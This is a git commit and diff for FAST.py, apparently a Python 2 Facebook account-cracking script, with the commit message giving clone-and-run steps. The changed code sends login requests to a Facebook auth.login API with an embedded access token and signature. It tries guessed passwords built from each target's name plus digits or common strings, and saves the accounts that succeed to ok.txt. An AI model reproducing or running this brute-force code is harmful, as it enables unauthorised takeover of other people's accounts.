4919ea693d4d020fc262dfa095d15674530c7e80
PY-14 <88144261+GUPTA-SHAKEL@users.noreply.github.com>
2021-07-30 09:05:06 +0100

    Update FAST.py
    git clone https://github.com/GUPTA-SHAKEL/FAST.git
    ls
    cd FAST
    ls
    python2 FAST.py

--- FAST.py
+++ FAST.py
@@ -580,7 +580,7 @@ def menu_select():
 
 		        else:
 
-		            pass2=name+"1234"
+		            pass2=name+"123"
 
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -602,7 +602,7 @@ def menu_select():
 
 		                if 'access_token' in d:
 
-		                    print("\x1b[1;96m[GUPTA-OK] "+uid+" | "+pass2+"\x1b[1;0m")
+		                    print("\x1b[1;96m[GUPTA] "+uid+" | "+pass2+"\x1b[1;0m")
 
 		                    ok=open("ok.txt","a")
 
@@ -614,7 +614,7 @@ def menu_select():
 
 		                else:
 
-		                    pass3=name+"12345"
+		                    pass3=name+"1234"
 
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -622,7 +622,7 @@ def menu_select():
 
 		                    if 'www.facebook.com' in d['error_msg']:
 
-		                        print("\033[1;96m[Successfull] "+uid+" | "+pass3)
+		                        print("\033[1;96m[GUPTA] "+uid+" | "+pass3)
 
 		                        cp=open("ok.txt","a")
 
@@ -682,7 +682,7 @@ def menu_select():
 
 		                                else:
 
-		                                    pass5="786786"
+		                                    pass5="445566"
 
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -750,7 +750,7 @@ def menu_select():
 
 		                                                else:
 
-		                                                    pass7="Nigeria"
+		                                                    pass7="112233"
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
